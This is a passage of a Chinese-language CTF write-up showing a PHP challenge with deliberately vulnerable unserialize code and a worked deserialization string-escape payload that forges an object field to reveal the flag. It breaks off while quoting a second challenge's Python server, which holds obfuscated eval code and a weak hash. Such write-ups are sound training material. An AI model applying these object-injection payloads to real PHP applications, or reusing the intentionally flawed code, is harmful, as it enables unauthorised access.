delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SCRIPT_FILENAME'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Deadly_Thirteen_Spears</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>        <span class="token string double-quoted-string">"di_yi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Lovesickness"</span><span class="token punctuation">,</span> <span class="token comment">//11 12</span>        <span class="token string double-quoted-string">"di_er_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Heartbreak"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_san_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Blind_Dragon"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_si_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Romantic_charm"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_wu_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Peerless"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_liu_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"White_Dragon"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_qi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Penetrating_Gaze"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_ba_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Kunpeng"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_jiu_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Night_Parade_of_a_Hundred_Ghosts"</span><span class="token punctuation">,</span> <span class="token comment">// 12 32</span>        <span class="token string double-quoted-string">"di_shi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Overlord"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_shi_yi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Letting_Go"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_shi_er_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Decisive_Victory"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_shi_san_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Unrepentant_Lethality"</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">Make_a_Move</span><span class="token punctuation">(</span><span class="token variable">$move</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="token keyword">as</span> <span class="token variable">$index</span> <span class="token operator">=></span> <span class="token variable">$movement</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$move</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$index</span><span class="token punctuation">,</span> <span class="token variable">$movement</span><span class="token punctuation">,</span> <span class="token variable">$move</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$move</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$Chant</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$Spear_Owner</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Nobody'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$chant</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Chant</span> <span class="token operator">=</span> <span class="token variable">$chant</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Spear_Owner</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Nobody'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Spear_Owner</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'MaoLei'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string single-quoted-string">'Far away from COOL...'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"Omg You're So COOOOOL!!! "</span> <span class="token operator">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FLAG'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>åªè¦è§¦å‘<code>__toString</code>å¹¶è®©<code>Spear_Owner === &#39;MaoLei&#39;</code>å°±è¡Œï¼Œæœ¬æ¥çœ‹ç€<code>Make_a_Move</code>è¿™ä¸ªæ–¹æ³•æ²¡ååº”è¿‡æ¥å¯ä»¥ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ï¼Œçœ‹äº†wpå¾—åˆ°æç¤º</p><p>é‚£ä¹ˆåªè¦é€šè¿‡Chantæ¥æ„é€ ï¼Œä½¿ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</p><pre class="language-php" data-language="php"><code class="language-php">å…ˆçœ‹æ­£å¸¸çš„ååºåˆ—åŒ–<span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">34</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Omg_It_Is_So_Cool_Bring_Me_My_Flag"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Chant"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Spear_Owner"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Nobody"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>å°†Chantæ›¿æ¢ä¸º<span class="token number">1</span><span class="token string double-quoted-string">";s:11:"</span>Spear_Owner<span class="token string double-quoted-string">";s:6:"</span>Nobody<span class="token string double-quoted-string">";&#125; ,O:34:"</span>Omg_It_Is_So_Cool_Bring_Me_My_Flag<span class="token string double-quoted-string">":2:&#123;s:5:"</span>Chant<span class="token string double-quoted-string">";s:36:"</span><span class="token number">1</span><span class="token string double-quoted-string">";s:11:"</span>Spear_Owner<span class="token string double-quoted-string">";s:6:"</span>Nobody<span class="token string double-quoted-string">";&#125;"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Spear_Owner"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Nobody"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>å­—ç¬¦ä¸²å¢åŠ äº†<span class="token number">35</span>ï¼Œ<span class="token string double-quoted-string">"di_yi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Lovesickness"</span><span class="token punctuation">,</span> <span class="token comment">//11 12 æ„é€ 35ä¸ªdi_yi_qiangå³å¯å­—ç¬¦ä¸²é€ƒé€¸</span>Payloadï¼š<span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>chant<span class="token operator">=</span>di_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiang<span class="token string double-quoted-string">";s:11:"</span>Spear_Owner<span class="token string double-quoted-string">";s:6:"</span>MaoLei"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h4><p>é¢˜ç›®ä»£ç :</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> secrets <span class="token keyword">import</span> users<span class="token punctuation">,</span> salt<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> base64<span class="token keyword">import</span> json<span class="token keyword">import</span> http<span class="token punctuation">.</span>server<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    FLAG <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gethash</span><span class="token punctuation">(</span><span class="token operator">*</span>items<span class="token punctuation">)</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>        <span class="token keyword">if</span> item <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        c <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>item<span class="token punctuation">&#125;</span></span><span class="token string">]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span> <span class="token comment"># it looks so complex! but is it safe enough?</span>    <span class="token keyword">return</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">assert</span> <span class="token string">"admin"</span> <span class="token keyword">in</span> users<span class="token keyword">assert</span> users<span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"admin"</span>hashed_users <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span>gethash<span class="token punctuation">(</span>k<span class="token punctuation">,</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> k<span class="token punctuation">,</span>v <span class="token keyword">in</span> users<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164</span><span class="token operator">^</span><span class="token number">8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">,</span><span class="token string">"big"</span><span class="token punctuation">,</span>signed<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token boolean">None</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string">"\x00"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># what is it?</span>    <span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># ummm...? It looks like it's just base64 encoding it 5 times? truely?</span>        <span class="token keyword">return</span> data__page__ <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">"PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5zaWduaW48L3RpdGxlPgogICAgPHNjcmlwdD4KICAgICAgICBbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoK3t9K1tdKVsrISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXVtbXV0rW10pWytbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoW10rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKVshK1tdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKShbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXSshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyhbXStbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKCFbXStbXSlbIStbXSshIVtdXSsoW10re30pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSkpWyErW10rISFbXSshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0pKCErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKChbXSt7fSlbK1tdXSlbK1tdXSsoIStbXSshIVtdKyEhW10rW10pKyhbXVtbXV0rW10pWyErW10rISFbXV0pKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXSt7fSlbKyEhW11dKygre30rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSkKICAgICAgICB2YXIgXzB4ZGI1ND1bJ3N0cmluZ2lmeScsJ2xvZycsJ3Bhc3N3b3JkJywnL2xvZ2luJywnUE9TVCcsJ2dldEVsZW1lbnRCeUlkJywndGhlbiddO3ZhciBfMHg0ZTVhPWZ1bmN0aW9uKF8weGRiNTRmYSxfMHg0ZTVhOTQpe18weGRiNTRmYT1fMHhkYjU0ZmEtMHgwO3ZhciBfMHg0ZDhhNDQ9XzB4ZGI1NFtfMHhkYjU0ZmFdO3JldHVybiBfMHg0ZDhhNDQ7fTt3aW5kb3dbJ2FwaV9iYXNlJ109Jyc7ZnVuY3Rpb24gbG9naW4oKXtjb25zb2xlW18weDRlNWEoJzB4MScpXSgnbG9naW4nKTt2YXIgXzB4NWYyYmViPWRvY3VtZW50W18weDRlNWEoJzB4NScpXSgndXNlcm5hbWUnKVsndmFsdWUnXTt2YXIgXzB4NGZkMjI2PWRvY3VtZW50W18weDRlNWEoJzB4NScpXShfMHg0ZTVhKCcweDInKSlbJ3ZhbHVlJ107dmFyIF8weDFjNjFkOT1KU09OW18weDRlNWEoJzB4MCcpXSh7J3VzZXJuYW1lJzpfMHg1ZjJiZWIsJ3Bhc3N3b3JkJzpfMHg0ZmQyMjZ9KTt2YXIgXzB4MTBiOThlPXsncGFyYW1zJzphdG9iKGF0b2IoYXRvYihhdG9iKGF0b2IoXzB4MWM2MWQ5KSkpKSl9O2ZldGNoKHdpbmRvd1snYXBpX2Jhc2UnXStfMHg0ZTVhKCcweDMnKSx7J21ldGhvZCc6XzB4NGU1YSgnMHg0JyksJ2JvZHknOkpTT05bXzB4NGU1YSgnMHgwJyldKF8weDEwYjk4ZSl9KVtfMHg0ZTVhKCcweDYnKV0oZnVuY3Rpb24oXzB4Mjk5ZDRkKXtjb25zb2xlW18weDRlNWEoJzB4MScpXShfMHgyOTlkNGQpO30pO30KICAgIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgogICAgPGgxPmV6U2lnbmluPC9oMT4KICAgIDxwPlNpZ24gaW4gdG8geW91ciBhY2NvdW50PC9wPgogICAgPHA+ZGVmYXVsdCB1c2VybmFtZSBhbmQgcGFzc3dvcmQgaXMgYWRtaW4gYWRtaW48L3A+CiAgICA8cD5Hb29kIEx1Y2shPC9wPgoKICAgIDxwPgogICAgICAgIHVzZXJuYW1lIDxpbnB1dCBpZD0idXNlcm5hbWUiPgogICAgPC9wPgogICAgPHA+CiAgICAgICAgcGFzc3dvcmQgPGlucHV0IGlkPSJwYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiPgogICAgPC9wPgogICAgPGJ1dHRvbiBpZCA9ICJsb2dpbiI+CiAgICAgICAgTG9naW4KICAgIDwvYnV0dG9uPgo8L2JvZHk+CjxzY3JpcHQ+CiAgICBjb25zb2xlLmxvZygiaGVsbG8/IikKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsb2dpbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgbG9naW4pOwo8L3NjcmlwdD4KPC9odG1sPg=="</span><span class="token punctuation">)</span>        <span class="token keyword">class</span> <span class="token class-name">MyHandler</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>server<span class="token punctuation">.</span>BaseHTTPRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">do_GET</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> self<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/"</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>__page__<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"404 Not Found"</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"500 Internal Server Error"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">do_POST</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> self<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/login"</span><span class="token punctuation">:</span>                body <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Content-Length"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                payload <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>body<span class="token punctuation">)</span>                params <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>decrypt<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token string">"params"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span>                <span class="token keyword">if</span> params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>                    self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                    self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"YOU CANNOT LOGIN AS ADMIN!"</span><span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span>                <span class="token keyword">if</span> params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token operator">==</span> params<span 